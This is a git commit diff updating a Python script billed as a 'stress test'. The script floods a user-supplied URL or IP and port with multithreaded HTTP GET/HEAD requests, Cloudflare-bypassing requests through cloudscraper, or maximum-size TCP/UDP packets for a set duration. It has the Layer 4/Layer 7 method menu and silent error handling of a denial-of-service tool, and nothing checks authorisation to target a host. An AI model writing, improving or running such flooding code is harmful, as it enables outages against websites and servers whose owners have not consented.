f1bfc7ba25b60c1eeabcb285413f05e802d92a37
Biasstudents <139652035+Biasstudents@users.noreply.github.com>
2023-07-21 13:54:30 +0600

    Update main.py

--- main.py
+++ main.py
@@ -1,7 +1,7 @@
-import aiohttp
+import cloudscraper
+import httpx
 import socket
 import threading
-import asyncio
 import time
 from colorama import Fore, Style, init
 
@@ -12,31 +12,32 @@ print("Layer 4: tcp, udp")
 protocol = input("Enter the method to use:")
 
 if protocol in ["get", "head", "cfb"]:
+    
     url = input("Enter the website URL (including http or https): ")
 elif protocol in ["tcp", "udp"]:
+    
     ip = input("Enter the IP address of the server: ")
     port = int(input("Enter the port number: "))
-
+    
 num_threads = int(input("Enter the number of threads to use: "))
+
 duration = int(input("Enter the duration of the stress test in seconds: "))
 
 if protocol == "udp":
-    packet_size = 65507  # Maximum size for a UDP packet
+    packet_size = 65507 # Maximum size for a UDP packet
 elif protocol == "tcp":
-    packet_size = 65535  # Maximum size for a TCP packet
-
+    packet_size = 65535 # Maximum size for a TCP packet
+ 
 packet_counter = 0
 packet_counter_lock = threading.Lock()
 
-async def stress_test(thread_id):
+def stress_test(thread_id):
     global packet_counter
 
     if protocol == "cfb":
-        async with aiohttp.ClientSession() as session:
-            await make_http_request(session)
+        client = cloudscraper.create_scraper()
     elif protocol in ["get", "head"]:
-        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
-            await make_http_request(session)
+        client = httpx.Client()
     elif protocol in ["tcp", "udp"]:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     else:
@@ -51,7 +52,11 @@ async def stress_test(thread_id):
         elif protocol in ["tcp", "udp"]:
             print(Fore.YELLOW + f"Stress testing started on {ip}:{port} successfully!" + Style.RESET_ALL)
     while time.time() - start_time < duration:
-        if protocol in ["tcp", "udp"]:
+        if protocol in ["get", "head", "cfb"]:
+            send_request(client)
+            with packet_counter_lock:
+                packet_counter += 1
+        elif protocol in ["tcp", "udp"]:
             send_packet(sock)
             with packet_counter_lock:
                 packet_counter += 1
@@ -60,47 +65,43 @@ async def stress_test(thread_id):
                 if protocol in ["get", "head", "cfb"]:
                     try:
                         response_start_time = time.time()
-                        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
-                            response = await session.get(url)
-                            response_end_time = time.time()
-                            response_time = round((response_end_time - response_start_time) * 1000, 2)
-                            print(Fore.GREEN + f"Website is up. Response time: {response_time} ms." + Style.RESET_ALL)
+                        response = httpx.get(url)
+                        response_end_time = time.time()
+                        response_time = round((response_end_time - response_start_time) * 1000, 2)
+                        print(Fore.GREEN + f"Website is up. Response time: {response_time} ms." + Style.RESET_ALL)
                     except Exception as e:
                         print(Fore.RED + f"Website is down." + Style.RESET_ALL)
                 elif protocol in ["tcp", "udp"]:
                     print(f"Sent {packet_counter} packets to {ip}:{port}")
                 last_print_time = time.time()
 
+def send_request(client):
+    try:
+        if protocol == "get":
+            response = client.get(url)
+        elif protocol == "head":
+            response = client.head(url)
+    except Exception as e:
+        pass # Suppress error messages
+
 def send_packet(sock):
     try:
         if protocol == "tcp":
             sock.connect((ip, port))
-            sock.send(b"X" * packet_size)  # Send a packet with maximum size
+            sock.send(b"X" * packet_size) # Send a packet with maximum size
             sock.close()
         elif protocol == "udp":
-            sock.sendto(b"X" * packet_size, (ip, port))  # Send a packet with maximum size
+            sock.sendto(b"X" * packet_size, (ip, port)) # Send a packet with maximum size
     except Exception as e:
-        pass
+        pass 
 
-async def make_http_request(session):
-    try:
-        if protocol == "get":
-            async with session.get(url) as response:
-                pass
-        elif protocol == "head":
-            async with session.head(url) as response:
-                pass
-    except Exception as e:
-        pass  # Suppress error messages
+threads = []
+for i in range(num_threads):
+    thread = threading.Thread(target=stress_test, args=(i,))
+    thread.start()
+    threads.append(thread)
 
-async def main():
-    tasks = []
-    for i in range(num_threads):
-        task = asyncio.create_task(stress_test(i))
-        tasks.append(task)
-
-    await asyncio.gather(*tasks)
-
-asyncio.run(main())
+for thread in threads:
+    thread.join()
 
 print(Fore.YELLOW + "Stress test ended." + Style.RESET_ALL)
